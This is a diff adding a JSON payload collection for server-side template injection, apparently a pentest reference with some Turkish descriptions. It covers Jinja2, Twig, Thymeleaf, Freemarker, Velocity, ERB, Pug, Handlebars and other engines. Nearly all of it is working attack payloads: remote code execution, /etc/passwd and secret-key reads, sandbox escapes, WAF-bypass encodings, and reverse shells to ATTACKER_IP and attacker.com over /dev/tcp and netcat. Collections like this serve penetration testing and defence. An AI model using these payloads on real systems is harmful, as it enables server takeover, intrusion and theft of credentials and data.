@@ -1,0 +1,492 @@
+{
+  "ssti_guide": {
+    "definition": {
+      "name": "Server-Side Template Injection",
+      "abbreviation": "SSTI",
+      "description": "Sunucu tarafı template motorlarının istismar edilmesinden kaynaklanan güvenlik açığı"
+    },
+    "methodology": {
+      "steps": [
+        {
+          "order": 1,
+          "name": "Tespit",
+          "description": "Template motoru kullanan web uygulamasında SSTI zafiyeti araştırması"
+        },
+        {
+          "order": 2,
+          "name": "Tanımlama",
+          "description": "Kullanılan template motorunun belirlenmesi"
+        },
+        {
+          "order": 3,
+          "name": "İstismar",
+          "description": "Tespit edilen zafiyetin sömürülmesi"
+        }
+      ]
+    },
+    "template_engine_detection": {
+      "decision_tree": {
+        "initial_payload": "${7*7}",
+        "branches": [
+          {
+            "payload": "${7*7}",
+            "responses": [
+              {
+                "result": "49",
+                "next_payload": "a{*comment*}b"
+              },
+              {
+                "result": "${7*7}",
+                "next_payload": "{{7*7}}"
+              }
+            ]
+          },
+          {
+            "payload": "a{*comment*}b",
+            "responses": [
+              {
+                "result": "ab",
+                "engines": ["Smarty", "Mako"]
+              },
+              {
+                "result": "a{*comment*}b",
+                "status": "Unknown"
+              }
+            ]
+          },
+          {
+            "payload": "{{7*7}}",
+            "responses": [
+              {
+                "result": "49",
+                "next_payload": "{{7*'7'}}"
+              },
+              {
+                "result": "Not vulnerable",
+                "status": "Safe"
+              }
+            ]
+          },
+          {
+            "payload": "{{7*'7'}}",
+            "responses": [
+              {
+                "result": "7777777",
+                "engine": "Jinja2"
+              },
+              {
+                "result": "49",
+                "engine": "Twig"
+              },
+              {
+                "result": "Not vulnerable",
+                "status": "Unknown"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "template_engines": {
+      "jinja2": {
+        "language": "Python",
+        "detection_payload": "{{7*'7'}}",
+        "expected_result": "7777777",
+        "rce_payloads": [
+          "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+          "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
+        ]
+      },
+      "twig": {
+        "language": "PHP",
+        "detection_payload": "{{7*'7'}}",
+        "expected_result": "49",
+        "rce_payloads": [
+          "{{['id']|filter('system')}}",
+          "{{['<command>']|filter('system')}}"
+        ]
+      },
+      "smarty": {
+        "language": "PHP",
+        "detection_payload": "a{*comment*}b",
+        "expected_result": "ab",
+        "rce_payloads": [
+          "{php}echo `id`;{/php}",
+          "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',true)}"
+        ]
+      },
+      "mako": {
+        "language": "Python",
+        "detection_payload": "a{*comment*}b",
+        "expected_result": "ab",
+        "rce_payloads": [
+          "<%import os%>${os.system('id')}",
+          "${__import__('os').system('ls')}"
+        ]
+      }
+    },
+    "exploitation_techniques": {
+      "command_execution": {
+        "description": "Template motor üzerinden sistem komutları çalıştırma",
+        "common_commands": ["id", "whoami", "ls", "cat /etc/passwd"]
+      },
+      "reverse_shell": {
+        "description": "Saldırganın makinesine bağlantı kuran shell",
+        "netcat_payload": "nc -e /bin/bash <attacker_ip> <port>"
+      },
+      "bind_shell": {
+        "description": "Hedef makinede port açarak shell erişimi sağlama",
+        "netcat_payload": "nc -nvlp <port> -e /bin/bash"
+      }
+    },
+    "common_payloads": {
+      "basic_math": [
+        "${7*7}",
+        "{{7*7}}",
+        "#{7*7}",
+        "${{7*7}}"
+      ],
+      "detection_tests": [
+        "{{7*'7'}}",
+        "a{*comment*}b",
+        "${{''.join('ab')}}"
+      ]
+    },
+    "references": {
+      "hacktricks": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection",
+      "portswigger": "https://portswigger.net/web-security/server-side-template-injection"
+    }
+  },
+  "flask_jinja2_advanced": {
+    "language": "Python",
+    "framework": "Flask (Jinja2)",
+    "detection": "{{7*'7'}} -> 7777777",
+    "category": "SSTI",
+    "type": "Advanced Jinja2",
+    "risk": "Critical",
+    "rce_payloads": [
+      "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+      "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+      "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
+      "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}",
+      "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+      "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{%endif%}{% endfor %}",
+      "{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+      "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+      "{{ joiner.__init__.__globals__.os.popen('id').read() }}",
+      "{{ namespace.__init__.__globals__.os.popen('id').read() }}"
+    ],
+    "file_read": [
+      "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+      "{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}",
+      "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}"
+    ],
+    "bypass_techniques": {
+      "attribute_access": [
+        "{{request['application']['__globals__']['__builtins__']['__import__']('os').popen('id').read()}}",
+        "{{request.application['__globals__']['__builtins__']['__import__']('os').popen('id').read()}}",
+        "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os').popen('id').read()}}"
+      ],
+      "string_concatenation": [
+        "{{'_'*2+'class'+'_'*2}}",
+        "{{request|attr('_'*2+'class'+'_'*2)}}",
+        "{{lipsum|attr('_'*2+'globals'+'_'*2)}}"
+      ],
+      "filter_bypass": [
+        "{{request|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
+        "{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
+        "{{(lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')).os.popen('id').read()}}"
+      ]
+    },
+    "purpose": "Flask/Jinja2 RCE exploitation"
+  },
+  "django_template": {
+    "language": "Python",
+    "framework": "Django",
+    "detection": "{{7*7}} -> 49",
+    "category": "SSTI",
+    "type": "Django Templates",
+    "risk": "Critical",
+    "rce_payloads": [
+      "{% load module %}{% my_tag_from_module %}",
+      "{{ request.META.environ }}",
+      "{% debug %}",
+      "{% load log %}{% get_log_entries 10 as log %}{% for l in log %}{{l.user.password}}{% endfor %}",
+      "{% load static %}{% get_static_prefix as STATIC_PREFIX %}{{STATIC_PREFIX}}",
+      "{% autoescape off %}{{user_input}}{% endautoescape %}",
+      "{% load module %}{% module_function param1 param2 %}"
+    ],
+    "settings_exposure": [
+      "{{ settings.SECRET_KEY }}",
+      "{{ settings.DATABASES }}",
+      "{% debug %}",
+      "{{ request.META }}"
+    ],
+    "bypass_techniques": {
+      "autoescape_off": [
+        "{% autoescape off %}{{payload}}{% endautoescape %}"
+      ],
+      "custom_tags": [
+        "{% load custom_tag %}{% custom_tag_rce %}"
+      ]
+    },
+    "note": "Django templates are more restrictive, focus on settings exposure and custom tag abuse",
+    "purpose": "Django template injection exploitation"
+  },
+  "tornado_template": {
+    "language": "Python",
+    "framework": "Tornado",
+    "detection": "{{7*7}} -> 49",
+    "category": "SSTI",
+    "type": "Tornado Templates",
+    "risk": "Critical",
+    "rce_payloads": [
+      "{% import os %}{{os.popen('id').read()}}",
+      "{% import subprocess %}{{subprocess.check_output('id',shell=True)}}",
+      "{% import sys %}{{sys.modules['os'].popen('id').read()}}",
+      "{%set x=__import__('os').popen('id').read()%}{{x}}",
+      "{% import __builtin__ %}{{__builtin__.__import__('os').popen('id').read()}}",
+      "{% module Template('{{__import__(\"os\").popen(\"id\").read()}}',loader=loader).generate() %}"
+    ],
+    "module_import": [
+      "{% import os %}",
+      "{% import subprocess %}",
+      "{% import sys %}",
+      "{% from os import popen %}"
+    ],
+    "purpose": "Tornado template RCE"
+  },
+  "erb_ruby": {
+    "language": "Ruby",
+    "framework": "ERB (Ruby)",
+    "detection": "<%= 7*7 %> -> 49",
+    "category": "SSTI",
+    "type": "Ruby ERB",
+    "risk": "Critical",
+    "rce_payloads": [
+      "<%= system('id') %>",
+      "<%= `id` %>",
+      "<%= IO.popen('id').read() %>",
+      "<%= %x{id} %>",
+      "<%= File.open('/etc/passwd').read %>",
+      "<%= Dir.entries('/') %>",
+      "<%= Kernel.exec('id') %>",
+      "<%= eval(\"__FILE__\") %>",
+      "<%= require 'open3'; Open3.capture2('id')[0] %>"
+    ],
+    "file_operations": [
+      "<%= File.read('/etc/passwd') %>",
+      "<%= File.open('/etc/passwd').read %>",
+      "<%= IO.read('/etc/passwd') %>",
+      "<%= File.readlines('/etc/passwd') %>"
+    ],
+    "reverse_shell": [
+      "<%= system('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1') %>",
+      "<%= `nc ATTACKER_IP PORT -e /bin/bash` %>",
+      "<%= IO.popen('nc ATTACKER_IP PORT -e /bin/bash').read %>"
+    ],
+    "purpose": "Ruby ERB template RCE"
+  },
+  "freemarker_java": {
+    "language": "Java",
+    "framework": "Freemarker",
+    "detection": "${7*7} -> 49",
+    "category": "SSTI",
+    "type": "Freemarker",
+    "risk": "Critical",
+    "rce_payloads": [
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"/bin/bash -c 'id'\") }",
+      "<#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()>${ ex(\"java.lang.ProcessBuilder\",\"id\").start() }",
+      "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+      "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"id\")</@value>"
+    ],
+    "file_read": [
+      "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\",\")}",
+      "<#assign uri=\"http://127.0.0.1:8080/../../../../etc/passwd\"?url><#assign input=uri?url.openStream()>${input.readAllBytes()?join(\",\")}"
+    ],
+    "api_class_exposure": [
+      "${objectModel.getClass()}",
+      "${objectModel.getClass().getProtectionDomain()}",
+      "${objectModel.getClass().getClassLoader()}"
+    ],
+    "purpose": "Freemarker SSTI to RCE"
+  },
+  "thymeleaf_java": {
+    "language": "Java",
+    "framework": "Thymeleaf",
+    "detection": "[[${7*7}]] -> 49",
+    "category": "SSTI",
+    "type": "Thymeleaf",
+    "risk": "Critical",
+    "rce_payloads": [
+      "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
+      "[[${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}]]",
+      "${__#ctx.getServletContext().getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",
+      "[[${#request.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}]]",
+      "[[${T(java.lang.ProcessBuilder)('id').start()}]]"
+    ],
+    "spring_boot_specific": [
+      "${#strings.toString(#request.getSession().getServletContext().getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id').getInputStream())}",
+      "${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}"
+    ],
+    "expression_objects": [
+      "${#ctx}",
+      "${#vars}",
+      "${#locale}",
+      "${#request}",
+      "${#response}",
+      "${#session}",
+      "${#servletContext}"
+    ],
+    "purpose": "Thymeleaf Spring Boot SSTI"
+  },
+  "velocity_java": {
+    "language": "Java",
+    "framework": "Apache Velocity",
+    "detection": "#set($x=7*7)$x -> 49",
+    "category": "SSTI",
+    "type": "Velocity",
+    "risk": "Critical",
+    "rce_payloads": [
+      "#set($s=\"\")\n#set($stringClass=$s.getClass())\n#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getRuntime())\n#set($process=$runtime.exec(\"id\"))\n$process.waitFor()\n#set($null=$process.getInputStream())\n#foreach($i in [1..$null.available()])$null.read()#end",
+      "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+      "#set($proc=\"java.lang.ProcessBuilder\")\n#set($constructor=$proc.class.getConstructor($proc.class))\n#set($cmd={\"id\"})\n#set($instance=$constructor.newInstance($cmd.class))\n#set($process=$instance.start())\n$process.waitFor()"
+    ],
+    "class_introspection": [
+      "$class.inspect(\"java.lang.Runtime\").type",
+      "#foreach($entry in $class.inspect('java.lang.Runtime').methods)$entry.key: $entry.value#end"
+    ],
+    "purpose": "Apache Velocity SSTI to RCE"
+  },
+  "pug_jade_nodejs": {
+    "language": "JavaScript/Node.js",
+    "framework": "Pug (Jade)",
+    "detection": "#{7*7} -> 49",
+    "category": "SSTI",
+    "type": "Pug/Jade",
+    "risk": "Critical",
+    "rce_payloads": [
+      "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('id')}()}",
+      "#{global.process.mainModule.require('child_process').execSync('id').toString()}",
+      "- var x = global.process.mainModule.require('child_process').execSync('id').toString()\n=x",
+      "#{global.process.mainModule.constructor._load('child_process').execSync('id')}",
+      "- global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"')"
+    ],
+    "code_execution": [
+      "- var x = 1; return x * 7",
+      "- console.log('RCE Test')",
+      "- var exec = global.process.mainModule.require('child_process').exec; exec('id')"
+    ],
+    "purpose": "Pug/Jade Node.js SSTI"
+  },
+  "handlebars_nodejs": {
+    "language": "JavaScript/Node.js",
+    "framework": "Handlebars",
+    "detection": "{{7*7}} -> 49 (depends on context)",
+    "category": "SSTI",
+    "type": "Handlebars",
+    "risk": "High",
+    "rce_payloads": [
+      "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+      "{{#with this as |obj|}}{{obj.constructor.constructor \"return global.process.mainModule.require('child_process').execSync('id').toString()\"()}}{{/with}}",
+      "{{#with this}}{{lookup ../constructor \"constructor\"}}(\"return global.process.mainModule.require('child_process').execSync('id')\"){{/with}}"
+    ],
+    "prototype_pollution": [
+      "{{#with \"constructor\"}}{{#with split as |arr|}}{{this.pop}}{{this.push \"alert('XSS')\";}}{{/with}}{{/with}}"
+    ],
+    "purpose": "Handlebars Node.js SSTI"
+  },
+  "mustache_generic": {
+    "language": "Multi-language",
+    "framework": "Mustache",
+    "detection": "{{7*7}} -> {{7*7}} (no execution)",
+    "category": "SSTI",
+    "type": "Mustache",
+    "risk": "Low-Medium",
+    "note": "Mustache is logic-less, limited SSTI potential",
+    "potential_exploits": [
+      "{{#lambda}}{{payload}}{{/lambda}}",
+      "Requires custom lambda functions in context"
+    ],
+    "xss_potential": [
+      "{{{user_input}}}",
+      "{{&user_input}}"
+    ],
+    "purpose": "Mustache template security notes"
+  },
+  "twig_php_advanced": {
+    "language": "PHP",
+    "framework": "Twig",
+    "detection": "{{7*'7'}} -> 49",
+    "category": "SSTI",
+    "type": "Advanced Twig",
+    "risk": "Critical",
+    "rce_payloads": [
+      "{{['id']|filter('system')}}",
+      "{{['id']|map('system')|join}}",
+      "{{['id',0]|sort('system')|join}}",
+      "{{['id']|reduce((a,b)=>`#{a}#{system(b)}`,'')}}",
+      "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+      "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}",
+      "{{_self.env.setCache('ftp://attacker.com/rce')}}{{_self.env.loadTemplate('file')}}",
+      "{{['cat /etc/passwd']|filter('system')}}"
+    ],
+    "file_read": [
+      "{{'/etc/passwd'|file_excerpt(1,30)}}",
+      "{{app.request.files.get(1).__construct('/etc/passwd','')}}{{app.request.files.get(1).openFile.fread(99)}}"
+    ],
+    "sandbox_escape": [
+      "{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}",
+      "{{_self.env.disableStrictVariables()}}"
+    ],
+    "purpose": "Twig PHP advanced SSTI exploitation"
+  },
+  "ssti_polyglot": {
+    "desc": "Polyglot SSTI payloads for multiple engines",
+    "category": "SSTI",
+    "type": "Polyglot",
+    "risk": "Critical",
+    "payloads": [
+      "${{<%[%'\"}}%\\.",
+      "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}",
+      "a{*comment*}b",
+      "${7*7}",
+      "{{7*'7'}}",
+      "<%= 7*7 %>",
+      "${{7*7}}",
+      "#{7*7}",
+      "*{7*7}"
+    ],
+    "purpose": "Universal SSTI detection payloads"
+  },
+  "ssti_waf_bypass": {
+    "desc": "WAF bypass techniques for SSTI",
+    "category": "SSTI",
+    "type": "WAF Bypass",
+    "risk": "Critical",
+    "techniques": {
+      "encoding": [
+        "{{request|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
+        "{{request|attr('\\u005f\\u005fclass\\u005f\\u005f')}}",
+        "{{request['\\x5f\\x5fclass\\x5f\\x5f']}}"
+      ],
+      "string_concatenation": [
+        "{{request|attr('_'*2+'class'+'_'*2)}}",
+        "{{request|attr(['_','_','cla','ss','_','_']|join)}}",
+        "{{'__cla'+'ss__'}}"
+      ],
+      "comment_insertion": [
+        "{{request{#comment#}.__class__}}",
+        "{{request.__class__{#bypass#}_}}"
+      ],
+      "attribute_tricks": [
+        "{{request['__class__']}}",
+        "{{request.__getattribute__('__class__')}}",
+        "{{request|attr('__class__')}}"
+      ]
+    },
+    "purpose": "SSTI WAF evasion"
+  }
+}
